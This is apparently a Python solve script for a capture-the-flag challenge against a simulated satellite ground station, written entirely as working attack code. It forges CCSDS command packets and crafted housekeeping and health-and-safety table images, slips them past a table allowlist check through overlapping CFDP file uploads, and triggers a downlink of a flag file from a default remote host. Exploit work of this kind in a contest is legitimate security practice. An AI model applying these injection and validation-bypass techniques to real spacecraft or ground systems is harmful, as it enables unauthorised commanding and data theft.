"""Solve the satellite ground-station challenge on a fresh instance.

Usage: python solve_satellite.py HOST PORT
       python solve_satellite.py --dry-run
"""
import argparse
import re
import socket
import struct
import time


def ccsds(apid, code, body=b""):
    packet = bytearray(struct.pack(">HHHBB", 0x1800 | apid, 0xC000, len(body) + 1, code, 0) + body)
    checksum = 0xFF
    for byte in packet:
        checksum ^= byte
    packet[7] = checksum
    return bytes(packet)


def table_image(name, data):
    fs_header = struct.pack(">8I32s", 0x63464531, 8, 64, 0x42, 1, 0, 0, 0, b"Table Image")
    tbl_header = struct.pack(">III40s", 0, 0, len(data), name.encode())
    return fs_header + tbl_header + data


def hk_entry(input_mid, input_offset, output_mid, output_offset, count):
    return struct.pack("<I H 2x I H H", input_mid, input_offset, output_mid, output_offset, count)


def build_payloads():
    defaults = [0x0801, 0x0805, 0x0803, 0x0800, 0x0804]
    entries = [hk_entry(mid, 12, 0x089C, 12 + 4 * i, 4) for i, mid in enumerate(defaults)]
    entries += [hk_entry(0x1888, 8, 0x18B3, 8, 136), hk_entry(0x1888, 144, 0x18B3, 6, 1)]
    hk = table_image("HK.CopyTable", b"".join(entries).ljust(2048, b"\0"))

    trigger = ccsds(0x9C, 0, struct.pack("<I", 0x18B3))
    mat = table_image("HS.MsgActs_Tbl", struct.pack("<HH4x16s", 1, 0, trigger))
    amt = table_image("HS.AppMon_Tbl", struct.pack("<20sHHH", b"NO_SUCH_APP", 0, 1, 4))

    # CF class 1, keep source, channel 1, priority 0, destination EID 23.
    cf_body = struct.pack("<BBBBI64s64s", 0, 1, 1, 0, 23, b"/cf/host/flag", b"flag")
    carrier = ccsds(0x88, 0, cf_body + b"\x20")
    assert len(hk) == 2164 and len(mat) == 140 and len(amt) == 142
    assert len(carrier) == 145 and len(trigger) == 12
    return hk, mat, amt, carrier


def cfdp_pdu(mode, txn, data):
    return bytes([mode]) + len(data).to_bytes(2, "big") + b"\0" + bytes([23, txn, 25]) + data


def cfdp_checksum(content):
    padded = content + b"\0" * (-len(content) % 4)
    return sum(int.from_bytes(padded[i:i + 4], "big") for i in range(0, len(padded), 4)) & 0xFFFFFFFF


def read_exact(sock, length):
    output = bytearray()
    while len(output) < length:
        try:
            part = sock.recv(length - len(output))
        except socket.timeout:
            if not output:
                raise
            continue
        if not part:
            raise EOFError("connection closed")
        output.extend(part)
    return bytes(output)


class Link:
    def __init__(self, host, port):
        self.sock = socket.create_connection((host, port), 5)
        self.sock.settimeout(0.4)
        self.parts = {}
        self.flag = None

    def send(self, kind, payload):
        self.sock.sendall(kind + len(payload).to_bytes(4, "big") + payload)

    def send_command(self, apid, code, body=b""):
        self.send(b"C", ccsds(apid, code, body))

    def receive(self, seconds, expected=None):
        end = time.time() + seconds
        while time.time() < end:
            try:
                header = read_exact(self.sock, 5)
                payload = read_exact(self.sock, int.from_bytes(header[1:], "big"))
            except socket.timeout:
                continue
            kind = header[:1]
            if kind == b"E":
                raise RuntimeError(payload.decode(errors="replace"))
            if kind == b"T" and payload[:2] == b"\x08\x08":
                event = payload[48:].split(b"\0")[0].decode(errors="replace")
                if event:
                    print("EV:", event, flush=True)
                if expected and expected in event:
                    return
            if kind == b"F" and len(payload) >= 11 and payload[0] & 0x10 and payload[4] == 25:
                offset = int.from_bytes(payload[7:11], "big")
                self.parts[offset] = payload[11:]
                content = b"".join(self.parts[pos] for pos in sorted(self.parts))
                found = re.search(rb"flag\{[^}]+\}", content)
                if found:
                    self.flag = found.group().decode()
                    if expected is None:
                        return
        if expected:
            raise TimeoutError(f"no event containing {expected!r}")

    def upload(self, name, content, txn, overlap=False):
        if overlap:
            # The first full file-data PDU passes the HK table allowlist check.
            cover = table_image("HK.CopyTable", bytes(len(content) - 116))
            assert len(cover) == len(content)
            versions = (cover, content)
        else:
            versions = (content,)
        filename = name.encode()
        metadata = b"\x07\0" + len(content).to_bytes(4, "big")
        metadata += bytes([len(filename)]) + filename + bytes([len(filename)]) + filename
        self.send(b"F", cfdp_pdu(0x20, txn, metadata))
        self.receive(0.5)
        for version in versions:
            for offset in range(0, len(version), 480):
                segment = offset.to_bytes(4, "big") + version[offset:offset + 480]
                self.send(b"F", cfdp_pdu(0x30, txn, segment))
                self.receive(0.5)
        eof = b"\x04\0" + cfdp_checksum(content).to_bytes(4, "big") + len(content).to_bytes(4, "big")
        self.send(b"F", cfdp_pdu(0x20, txn, eof))
        self.receive(12, f"successfully retained file as /cf/uplink/{name}")

    def load_and_validate(self, filename, table_name):
        self.send_command(0x04, 2, f"/cf/uplink/{filename}".encode().ljust(64, b"\0"))
        self.receive(10, "Successful load into working buffer")
        self.send_command(0x04, 4, b"\0\0" + table_name.encode().ljust(40, b"\0"))
        self.receive(10, "validation successful")

    def activate(self, table_name):
        self.send_command(0x04, 5, table_name.encode().ljust(40, b"\0"))
        self.receive(10, f"Successfully Updated '{table_name}'")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?", default="39.105.83.238")
    parser.add_argument("port", nargs="?", type=int, default=30835)
    parser.add_argument("--dry-run", action="store_true")
    args = parser.parse_args()
    hk, mat, amt, carrier = build_payloads()
    if args.dry_run:
        print("payload sizes:", len(hk), len(mat), len(amt), len(carrier))
        return
    link = Link(args.host, args.port)
    try:
        link.upload("hk_cf.tbl", hk, 200)
        link.load_and_validate("hk_cf.tbl", "HK.CopyTable")
        link.activate("HK.CopyTable")

        link.upload("hs_mat_x.tbl", mat, 201, overlap=True)
        link.load_and_validate("hs_mat_x.tbl", "HS.MsgActs_Tbl")
        link.activate("HS.MsgActs_Tbl")

        link.upload("hs_amt_x.tbl", amt, 202, overlap=True)
        link.load_and_validate("hs_amt_x.tbl", "HS.AppMon_Tbl")
        link.send(b"C", carrier)  # HK copies this invalid-length MM NOOP before AMT triggers.
        link.receive(2)
        link.activate("HS.AppMon_Tbl")
        if not link.flag:
            link.receive(30)
        if not link.flag:
            raise TimeoutError("CFDP flag file was not received")
        print("FLAG:", link.flag)
    finally:
        link.sock.close()


if __name__ == "__main__":
    main()
